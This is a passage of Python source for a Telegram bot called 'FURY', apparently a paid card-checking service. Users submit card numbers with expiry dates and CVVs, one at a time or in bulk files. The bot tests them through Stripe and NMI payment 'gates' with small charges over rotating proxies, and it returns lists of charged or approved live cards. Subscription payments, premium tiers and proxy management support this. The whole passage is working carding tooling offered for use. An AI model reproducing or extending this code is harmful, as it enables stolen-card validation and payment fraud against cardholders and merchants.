    "sub_1day":   {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐘𝐚𝐰𝐦 𝐖𝐚𝐡𝐢𝐝", "days": 1,  "stars": 100,  "desc": "𝟏 𝐘𝐚𝐰𝐦"},
    "sub_7days":  {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐔𝐬𝐛𝐮𝐞",       "days": 7,  "stars": 500,  "desc": "𝟕 𝐀𝐲𝐚𝐦"},
    "sub_15days": {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝟏𝟓 𝐘𝐚𝐰𝐦",      "days": 15, "stars": 700,  "desc": "𝟏𝟓 𝐘𝐚𝐰𝐦"},
    "sub_30days": {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐒𝐡𝐚𝐡𝐫",       "days": 30, "stars": 1000, "desc": "𝟑𝟎 𝐘𝐚𝐰𝐦"},
}

SUB_MENU_TEXT = (
    "𝐊𝐡𝐮𝐭𝐭𝐚𝐭 𝐀𝐥𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞\n"
    "_____________________________\n"
    "𝟏  𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟏𝟎𝟎\n"
    "𝟕  𝐀𝐲𝐚𝐦   𝐍𝐚𝐣𝐦𝐚 𝟓𝟎𝟎\n"
    "𝟏𝟓 𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟕𝟎𝟎\n"
    "𝟑𝟎 𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟏𝟎𝟎𝟎\n"
    "_____________________________\n"
    "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
)

def build_sub_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(
        telebot.types.InlineKeyboardButton("𝟏  𝐘𝐚𝐰𝐦  𝟏𝟎𝟎 ✩", callback_data="sub_1day", style="primary"),
        telebot.types.InlineKeyboardButton("𝟕  𝐀𝐲𝐚𝐦  𝟓𝟎𝟎 ✩", callback_data="sub_7days", style="primary"),
        telebot.types.InlineKeyboardButton("𝟏𝟓 𝐘𝐚𝐰𝐦  𝟕𝟎𝟎 ✩", callback_data="sub_15days", style="primary"),
        telebot.types.InlineKeyboardButton("𝟑𝟎 𝐘𝐚𝐰𝐦  𝟏𝟎𝟎𝟎 ✩", callback_data="sub_30days", style="primary"),
        telebot.types.InlineKeyboardButton("𝐁𝐚𝐜𝐤", callback_data="menu_back", style="primary")
    )
    return mk

def add_premium_days(user_id, days):
    exp = time.time() + (days * 86400)
    existing = []
    try:
        with open(PREMIUM_FILE, 'r') as f:
            existing = f.readlines()
    except:
        existing = []
    with open(PREMIUM_FILE, 'w') as f:
        for line in existing:
            if str(user_id) not in line:
                f.write(line)
        f.write(f"{user_id}|{exp}\n")

@bot.callback_query_handler(func=lambda c: c.data in SUB_PLANS)
def cb_sub_plan(call):
    plan_key = call.data
    plan = SUB_PLANS[plan_key]
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    try:
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title=plan["title"],
            description=f"𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐥𝐢𝐦𝐮𝐝𝐝𝐚𝐭 {plan['desc']}",
            invoice_payload=plan_key,
            provider_token="",
            currency="XTR",
            prices=[telebot.types.LabeledPrice(label=plan["title"], amount=plan["stars"])],
        )
    except Exception as e:
        bot.send_message(call.message.chat.id, f"<b>Error</b>: {str(e)[:100]}", parse_mode="HTML")

@bot.pre_checkout_query_handler(func=lambda q: True)
def precheckout_handler(pre_checkout_query):
    if pre_checkout_query.invoice_payload in SUB_PLANS:
        try:
            bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        except Exception as e:
            print(f"[PRECHECKOUT] failed: {e}")
    else:
        try:
            bot.answer_pre_checkout_query(
                pre_checkout_query.id,
                ok=False,
                error_message="𝐇𝐚𝐝𝐡𝐚 𝐚𝐥𝐤𝐡𝐢𝐲𝐚𝐫 𝐠𝐡𝐚𝐲𝐫 𝐦𝐚𝐰𝐣𝐮𝐝"
            )
        except:
            pass

@bot.message_handler(content_types=['successful_payment'])
def successful_payment_handler(message):
    payment = message.successful_payment
    user_id = message.from_user.id
    payload = payment.invoice_payload
    plan = SUB_PLANS.get(payload)
    if not plan:
        return
    add_premium_days(user_id, plan["days"])
    try:
        s = get_stats()
        s["premium_users"] = s.get("premium_users", 0) + 1
        save_stats(s)
    except:
        pass
    exp_date = datetime.datetime.fromtimestamp(time.time() + plan["days"] * 86400).strftime("%Y-%m-%d")
    bot.send_message(
        message.chat.id,
        "𝐓𝐚𝐦𝐚𝐦𝐚𝐭 𝐚𝐥𝐃𝐚𝐟𝐚𝐚 𝐛𝐢𝐧𝐚𝐣𝐚𝐡\n"
        "_____________________________\n"
        f"𝐀𝐥𝐤𝐡𝐮𝐭𝐭𝐚 : {plan['title']}\n"
        f"𝐀𝐥𝐦𝐮𝐝𝐝𝐚 : {plan['desc']}\n"
        f"𝐀𝐥𝐧𝐚𝐣𝐦𝐚𝐭 : {payment.total_amount}\n"
        f"𝐘𝐚𝐧𝐭𝐚𝐡𝐢 𝐟𝐢 : {exp_date}\n"
        "_____________________________\n"
        "𝐓𝐚𝐦𝐦𝐚 𝐭𝐚𝐟𝟑𝐢𝐥 𝐚𝐥𝐢𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐭𝐢𝐥𝐪𝐚𝟐𝐢𝐲𝐚𝐧.",
        parse_mode="HTML"
    )
    try:
        bot.send_message(
            ADMIN_ID,
            "𝐍𝐞𝐰 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧\n"
            f"𝐔𝐬𝐞𝐫 : {user_id}\n"
            f"𝐏𝐥𝐚𝐧 : {plan['title']}\n"
            f"𝐒𝐭𝐚𝐫𝐬 : {payment.total_amount}",
            parse_mode="HTML"
        )
    except:
        pass

@bot.message_handler(commands=['setnmicart'])
def set_nmi_cart(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, bold("Usage:") + " /setnmicart <cartId> <checkoutId>", parse_mode="HTML")
            return
        save_nmi_cart(parts[1], parts[2])
        bot.reply_to(message, f"{bold('NMI Cart saved')}:\n{bold('Cart')}: {parts[1]}\n{bold('Checkout')}: {parts[2]}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /setnmicart <cartId> <checkoutId>", parse_mode="HTML")

@bot.message_handler(commands=['nmicart'])
def show_nmi_cart(message):
    cart, chk = load_nmi_cart()
    bot.reply_to(message, f"{bold('NMI Cart')}:\n{HLINE*20}\n{bold('Cart')}: {cart}\n{bold('Checkout')}: {chk}\n{bold('Amount')}: {NMI_AMOUNT} {NMI_CURRENCY}", parse_mode="HTML")

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "<b>Only the owner can manage proxies.</b>", parse_mode="HTML")
        return
    if is_banned(user_id):
        bot.reply_to(message, "<b>You are banned!</b>", parse_mode="HTML")
        return

    text = message.text.strip()
    parts = text.split(maxsplit=1)

    if len(parts) < 2:
        cmds_text = (
            f"{bold('Proxy Commands')}\n"
            f"{HLINE*20}\n"
            f"/proxy add <proxy>  \u2794  {bold('Add proxies')}\n"
            f"/proxy list        \u2794  {bold('List proxies')}\n"
            f"/proxy test        \u2794  {bold('Test proxies')}\n"
            f"/proxy clean       \u2794  {bold('Clean dead proxies')}\n"
            f"/proxy remove <i>  \u2794  {bold('Remove proxy')}"
        )
        bot.reply_to(message, cmds_text, parse_mode="HTML")
        return

    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        proxies_to_add = []
        if arg:
            proxies_to_add = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            rep = message.reply_to_message
            raw = rep.text or rep.caption or ''
            proxies_to_add = [l.strip() for l in raw.splitlines() if l.strip()]
            
        if not proxies_to_add:
            bot.reply_to(message, bold("Usage:") + " /proxy add <proxy>", parse_mode="HTML")
            return
            
        msg = bot.reply_to(message, f"{bold('Testing')} {len(proxies_to_add)} {bold('proxies')}...", parse_mode="HTML")
        res = test_proxies_bulk(proxies_to_add)
        working = res["working"]
        invalid = len(res["invalid"])
        dead = len(res["dead"])
        
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                existing = [l.strip() for l in f if l.strip()]
                
        existing_set = set(existing)
        new_working = [p for p in working if p not in existing_set]
        skipped = len(working) - len(new_working)
        
        final_list = list(dict.fromkeys(existing + working))
        save_proxies(final_list)
        
        result = (f"{bold('Proxy Add Result')}\n{'='*20}\n"
                  f"{bold('Total')}: {len(proxies_to_add)}\n{bold('Working')}: {len(working)}\n"
                  f"{bold('Duplicate')}: {skipped}\n{bold('Invalid')}: {invalid}\n{bold('Dead')}: {dead}")
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
        except:
            bot.reply_to(message, result, parse_mode="HTML")

    elif cmd == 'list':
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, bold("No proxies found"), parse_mode="HTML")
            return
        lines = [f"{bold('Proxies')} ({len(proxies)})"]
        for i, p in enumerate(proxies, 1):
            masked = p[:20] + '...' if len(p) > 23 else p
            lines.append(f"{i}. {masked}")
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")

    elif cmd == 'remove':
        if not arg:
            bot.reply_to(message, bold("Usage:") + " /proxy remove <index/all>", parse_mode="HTML")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([])
            bot.reply_to(message, bold("All proxies removed"), parse_mode="HTML")
            return
        try:
            idx = int(arg)
            removed = proxies.pop(idx - 1)
            save_proxies(proxies)
            bot.reply_to(message, f"{bold('Removed')}: {removed}", parse_mode="HTML")
        except:
            bot.reply_to(message, bold("Usage:") + " /proxy remove <index/all>", parse_mode="HTML")

    elif cmd == 'test':
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, bold("No proxies found"), parse_mode="HTML")
            return
        msg = bot.reply_to(message, f"{bold('Testing')} {len(proxies)} {bold('proxies')}...", parse_mode="HTML")
        res = test_proxies_bulk(proxies)
        working = res["working"]
        dead = len(res["dead"])
        save_proxies(working)
        result = (f"{bold('Proxy Test Result')}\n{'='*20}\n"
                  f"{bold('Tested')}: {len(proxies)}\n{bold('Working')}: {len(working)}\n{bold('Dead')}: {dead}")
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
        except:
            bot.reply_to(message, result, parse_mode="HTML")
            
    elif cmd == 'clean':
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, bold("No proxies found to clean."), parse_mode="HTML")
            return
        msg = bot.reply_to(message, f"{bold('Cleaning')} {len(proxies)} {bold('proxies')}...", parse_mode="HTML")
        res = test_proxies_bulk(proxies)
        working = res["working"]
        save_proxies(working)
        result = (f"{bold('Proxy Clean Result')}\n{'='*20}\n"
                  f"{bold('Total')}: {len(proxies)}\n{bold('Working')}: {len(working)}\n"
                  f"{bold('Removed (Dead)')}: {len(proxies) - len(working)}")
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
        except:
            bot.reply_to(message, result, parse_mode="HTML")

def build_main_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=2)
    mk.row(
        telebot.types.InlineKeyboardButton("𝐆𝐀𝐓𝐄", callback_data="menu_gates", style="primary"),
        telebot.types.InlineKeyboardButton("𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞", callback_data="menu_sub", style="primary"),
    )
    mk.row(
        telebot.types.InlineKeyboardButton("𝐅𝐔𝐑𝐘", url="https://t.me/FUYRM1", style="primary"),
    )
    return mk

def build_gates_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(
        telebot.types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡", callback_data="gate_stripe", style="primary"),
        telebot.types.InlineKeyboardButton("𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟐$", callback_data="gate_nmi", style="primary"),
        telebot.types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟐.𝟎𝟎$", callback_data="gate_sc", style="primary"),
        telebot.types.InlineKeyboardButton("𝐁𝐚𝐜𝐤", callback_data="menu_back", style="primary"),
    )
    return mk

def build_back_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(telebot.types.InlineKeyboardButton("𝐁𝐚𝐜𝐤", callback_data="menu_gates", style="primary"))
    return mk

@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_") or c.data.startswith("gate_"))
def cb_menu(call):
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    data = call.data
    chat_id = call.message.chat.id

    if data == "menu_gates":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        text = (
            "𝐁𝐚𝐰𝐰𝐚𝐛𝐚𝐭\n"
            "_____________________________\n"
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
            "𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟐$\n"
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟐.𝟎𝟎$\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_gates_keyboard())
        return

    if data == "menu_sub":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=SUB_MENU_TEXT, parse_mode="HTML", reply_markup=build_sub_keyboard())
        return

    if data == "menu_back":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        user = call.from_user
        fname = user.first_name or "User"
        username = user.username
        text = build_start_text(user.id, fname, username)
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_main_keyboard())
        return

    if data == "gate_stripe":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        text = (
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
            "_____________________________\n"
            "/st  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/mst 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_back_keyboard())
        return

    if data == "gate_nmi":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        text = (
            "𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟐$\n"
            "_____________________________\n"
            "/nmi  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/mnmi 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_back_keyboard())
        return

    if data == "gate_sc":
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        text = (
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟐.𝟎𝟎$\n"
            "_____________________________\n"
            "/sc  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/msc 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_back_keyboard())
        return

def build_start_text(user_id, fname, username):
    joined_date = datetime.datetime.now().strftime("%Y-%m-%d")
    greet = (
        f"𝐀𝐡𝐥𝐚𝐧 𝐰𝐚 𝐒𝐚𝐡𝐥𝐚𝐧 𝐟𝐢 𝐅𝐔𝐑𝐘\n"
        f"{HLINE * 19}\n"
        f"𝐀𝐥𝐦𝐮𝐬𝐭??𝐤𝐡𝐝𝐢𝐦 ≫ <a href='tg://user?id={user_id}'>{fname}</a>\n"
        f"𝐀𝐥𝐀𝐲𝐝𝐢 ≫ <a href='tg://user?id={user_id}'>{user_id}</a>\n"
        f"𝐀𝐥𝐈𝐧𝐝𝐡𝐢𝐦𝐚𝐦 ≫ {joined_date}\n"
        f"{HLINE * 19}\n"
        f"𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
    )
    
    if is_admin(user_id):
        admin_cmds = f"""
𝐀𝐃𝐌𝐈𝐍
{HLINE * 15}
/setnmicart ➔ 𝐍𝐌𝐈 𝐂𝐚𝐫𝐭
/nmicart ➔ 𝐒𝐡𝐨𝐰 𝐍𝐌𝐈
/addpremium ➔ 𝐀𝐝𝐝 𝐏𝐫𝐞𝐦
/rmpremium ➔ 𝐑𝐦 𝐏𝐫𝐞𝐦
/ban ➔ 𝐁𝐚𝐧
/unban ➔ 𝐔𝐧𝐛𝐚𝐧
/stats ➔ 𝐒𝐭𝐚𝐭𝐬

𝐏𝐑𝐎𝐗𝐘
{HLINE * 15}
/proxy add ➔ 𝐀𝐝𝐝
/proxy list ➔ 𝐋𝐢𝐬𝐭
/proxy remove ➔ 𝐑𝐞𝐦𝐨𝐯𝐞
/proxy test ➔ 𝐓𝐞𝐬𝐭
/proxy clean ➔ 𝐂𝐥𝐞𝐚𝐧
{HLINE * 15}
𝐃𝐞𝐯 : @FUYRM1"""
        return greet + admin_cmds
    return greet

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    
    fname = message.from_user.first_name
    if not fname:
        fname = "User"
        
    username = message.from_user.username
    if not username:
        username = "NoUsername"
        
    menu = build_start_text(user_id, fname, username)

    try:
        bot.send_animation(message.chat.id, START_ANIMATION_URL, caption=menu, parse_mode="HTML", reply_markup=build_main_keyboard())
    except Exception as e:
        print(f"[START] animation failed: {e}")
        try:
            bot.send_message(message.chat.id, menu, parse_mode="HTML", reply_markup=build_main_keyboard())
        except: pass

@bot.message_handler(commands=['st', 'nmi', 'sc'])
def single_check(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    cmd = message.text.split()[0].replace('/', '')
    
    if cmd == 'st' and ACTIVE_USERS_ST.get(user_id): return
    if cmd == 'nmi' and ACTIVE_USERS_NMI.get(user_id): return
    if cmd == 'sc' and ACTIVE_USERS_SE.get(user_id): return

    allowed, used, limit, reset_in = consume_check(user_id)
    if not allowed:
        bot.reply_to(message, check_limit_message(used, limit, reset_in), parse_mode="HTML")
        return

    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first."), parse_mode="HTML")
        return

    cc = None
    if len(message.text.split()) > 1: cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        t = message.reply_to_message.text or message.reply_to_message.caption or ""
        m = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', t)
        if m: cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
    if not cc:
        bot.reply_to(message, f"{bold_capitalize('Format')}: /{cmd} 4111...|12|25|123", parse_mode="HTML")
        return

    if cmd == 'st': ACTIVE_USERS_ST[user_id] = True
    elif cmd == 'nmi': ACTIVE_USERS_NMI[user_id] = True
    elif cmd == 'sc': ACTIVE_USERS_SE[user_id] = True

    gate_name = "Stripe Auth" if cmd == 'st' else ("NMI Charge" if cmd == 'nmi' else "Stripe Charge 2$")
    msg = bot.reply_to(message, f"{bold_capitalize(f'Processing {gate_name}')}... [{used}/{limit}]", parse_mode="HTML")
    
    t_start = time.time()
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
    status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
    
    for _ in range(MAX_RETRIES):
        proxy_dict, p_raw = get_proxy_dict()
        try:
            if cmd == 'st': status, response, brand_auto = check_cc(cc, proxy_dict)
            elif cmd == 'nmi': status, response, brand_auto = check_cc_nmi(cc, proxy_dict)
            elif cmd == 'sc': status, response, brand_auto = check_cc_southernexposure(cc, proxy_dict)
            if status != "ERROR" or "Session Expired" in response: break
        finally: release_proxy(p_raw)
    
    elapsed = str(round(time.time() - t_start, 2))
    brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
    
    res = build_template(gate_name, "gate", status, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=cc)
    
    if limit > 0: res += f"\n\n\U0001f4ca {bold_capitalize('Daily')}: {used}/{limit}"
    
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    
    try:
        bot.send_animation(message.chat.id, START_ANIMATION_URL, caption=res, parse_mode="HTML")
    except:
        bot.reply_to(message, res, parse_mode="HTML")
    
    if cmd == 'st': ACTIVE_USERS_ST[user_id] = False
    elif cmd == 'nmi': ACTIVE_USERS_NMI[user_id] = False
    elif cmd == 'sc': ACTIVE_USERS_SE[user_id] = False
    time.sleep(CARD_DELAY)

@bot.message_handler(commands=['mst', 'mnmi', 'msc'])
def mass_check(message):
    user_id = message.from_user.id
    if is_banned(user_id): return
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "⚠️ <b>This feature is for Premium users only.</b>", parse_mode="HTML")
        return
    
    cmd = message.text.split()[0].replace('/', '')
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first."), parse_mode="HTML")
        return

    is_file_mode = False
    ccs = []
    
    if message.reply_to_message and message.reply_to_message.document:
        is_file_mode = True
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8')
        ccs = file_content.splitlines()
    elif len(message.text.split()) > 1:
        text_body = message.text.split(maxsplit=1)[1]
        ccs = text_body.splitlines()
    elif message.reply_to_message and message.reply_to_message.text:
        ccs = message.reply_to_message.text.splitlines()

    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip() and '|' in l]))

    if not ccs:
        bot.reply_to(message, bold("No cards found."), parse_mode="HTML")
        return
    
    gate_name = "Stripe Auth" if cmd == 'mst' else ("NMI Charge" if cmd == 'mnmi' else "Stripe Charge 2$")
    limit = ADMIN_LIMIT if is_admin(user_id) else PREMIUM_LIMIT
    if len(ccs) > limit: ccs = ccs[:limit]
    
    total = len(ccs)
    start_time = time.time()

    if is_file_mode:
        job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
        ACTIVE_JOBS[job_id] = True
        LIVE_HITS[job_id] = {"charged": [], "approved": []}
        
        results = {"approved": 0, "charged": 0, "live": 0, "3ds": 0, "declined": 0, "error": 0, "checked": 0}
        approved_list = []
        update_lock = threading.Lock()

        prog_msg = bot.reply_to(message, build_mass_caption(gate_name, results, total, start_time), reply_markup=build_dashboard_keyboard(results, total, job_id), parse_mode="HTML")

        def worker(cc):
            if not ACTIVE_JOBS.get(job_id): return
            t_single = time.time()
            status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
            for _ in range(MAX_RETRIES):
                proxy_dict, p_raw = get_proxy_dict()
                try:
                    if cmd == 'mst': status, response, brand_auto = check_cc(cc, proxy_dict)
                    elif cmd == 'mnmi': status, response, brand_auto = check_cc_nmi(cc, proxy_dict)
                    elif cmd == 'msc': status, response, brand_auto = check_cc_southernexposure(cc, proxy_dict)
                    if status != "ERROR" or "Session Expired" in response: break
                finally: release_proxy(p_raw)
                time.sleep(2)
            
            elapsed_single = str(round(time.time() - t_single, 2))
            with update_lock:
                if status == "CHARGED":
                    results["charged"] += 1
                    approved_list.append(f"[CHARGED] {cc}")
                    LIVE_HITS[job_id]["charged"].append(cc)
                elif status == "APPROVED":
                    results["live"] += 1
                    approved_list.append(f"[APPROVED] {cc}")
                    LIVE_HITS[job_id]["approved"].append(cc)
                elif status == "3DS": results["3ds"] += 1
                elif status == "DECLINED": results["declined"] += 1
                else: results["error"] += 1
                results["checked"] += 1

            if status in ["CHARGED", "LIVE", "APPROVED", "3DS"]:
                brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
                brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
                single_res = build_template(gate_name, "gate", status, response, brand, bank, country, level, type_cc, flag, elapsed_single, cc_full=cc, is_mass=False)
                try: 
                    bot.send_animation(message.chat.id, START_ANIMATION_URL, caption=single_res, parse_mode="HTML")
                except: 
                    bot.send_message(message.chat.id, single_res, parse_mode="HTML")

            try: 
                bot.edit_message_text(
                    build_mass_caption(gate_name, results, total, start_time), 
                    message.chat.id, 
                    prog_msg.message_id, 
                    reply_markup=build_dashboard_keyboard(results, total, job_id), 
                    parse_mode="HTML"
                )
            except: pass
            time.sleep(CARD_DELAY)

        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            for cc in ccs:
                if not ACTIVE_JOBS.get(job_id): break
                executor.submit(worker, cc)
                
        ACTIVE_JOBS.pop(job_id, None)
        
        if approved_list:
            filename = f"mass_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=========================================\n       FURY MASS CHECK RESULTS\n=========================================\n\n")
                charged = [c for c in approved_list if "[CHARGED]" in c]
                live = [c for c in approved_list if "[LIVE]" in c]
                apprv = [c for c in approved_list if "[APPROVED]" in c]
                
                if "Stripe Auth" in gate_name:
                    if apprv:
                        f.write("[+] APPROVED CARDS :\n-----------------------------------------\n")
                        for c in apprv: f.write(c.replace("[APPROVED] ", "") + "\n")
                        f.write("\n")
                    f.write("=========================================\n")
                    f.write(f"Total Approved: {len(apprv)}\n")
                    f.write("=========================================\n")
                else:
                    if charged:
                        f.write("[+] CHARGED CARDS :\n-----------------------------------------\n")
                        for c in charged: f.write(c.replace("[CHARGED] ", "") + "\n")
                        f.write("\n")
                    f.write("=========================================\n")
                    f.write(f"Total Charged: {len(charged)}\n")
                    f.write("=========================================\n")
                
            with open(filename, 'rb') as f: bot.send_document(message.chat.id, f, caption=f"✅ {gate_name} Mass Finished")
            os.remove(filename)
        else:
            bot.send_message(message.chat.id, "⚠️ <b>No hits found.</b>", parse_mode="HTML")

    else:
        prog_msg = bot.reply_to(message, f"✦ {bold_capitalize('Mass Testing')} ✦\n➔ {bold_capitalize('Limit')} : {total}/{limit}\n\n◈ {bold_capitalize('Status')} - {bold_capitalize('Checking')}...", parse_mode="HTML")

        def process_mass():
            all_results_text = "" 
            for cc in ccs:
                t_single = time.time()
                status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
                
                for _ in range(MAX_RETRIES):
                    proxy_dict, p_raw = get_proxy_dict()
                    try:
                        if cmd == 'mst': status, response, brand_auto = check_cc(cc, proxy_dict)
                        elif cmd == 'mnmi': status, response, brand_auto = check_cc_nmi(cc, proxy_dict)
                        elif cmd == 'msc': status, response, brand_auto = check_cc_southernexposure(cc, proxy_dict)
                        if status != "ERROR" or "Session Expired" in response: break
                    finally: release_proxy(p_raw)
                    time.sleep(2)
                
                elapsed_single = str(round(time.time() - t_single, 2))
                brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
                brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()

                single_res = build_template(gate_name, "gate", status, response, brand, bank, country, level, type_cc, flag, elapsed_single, cc_full=cc, is_mass=True)
                
                all_results_text += single_res + "\n\n"
                
                time.sleep(CARD_DELAY)

            try:
                bot.delete_message(message.chat.id, prog_msg.message_id)
            except: pass

            elapsed_mass = int(time.time() - start_time)
            mins, secs = divmod(elapsed_mass, 60)
            time_str = f"{mins:02d}:{secs:02d}"
            
            final_message = f"✦ {bold_capitalize('Mass Results')} ✦\n\n{all_results_text}⏱ {bold_capitalize('Time')} : {time_str}\n✦ {bold_capitalize('By')} : <a href='https://t.me/FUYRM1'>fᑌᖇY</a> ✦"

            if final_message.strip():
                if len(final_message) <= 4000:
                    bot.send_message(message.chat.id, final_message, parse_mode="HTML")
                else:
                    chunks = [final_message[i:i+4000] for i in range(0, len(final_message), 4000)]
                    for chunk in chunks:
                        bot.send_message(message.chat.id, chunk, parse_mode="HTML")
                        time.sleep(1)
            else:
                bot.send_message(message.chat.id, "⚠️ <b>No hits found.</b>", parse_mode="HTML")

        threading.Thread(target=process_mass).start()

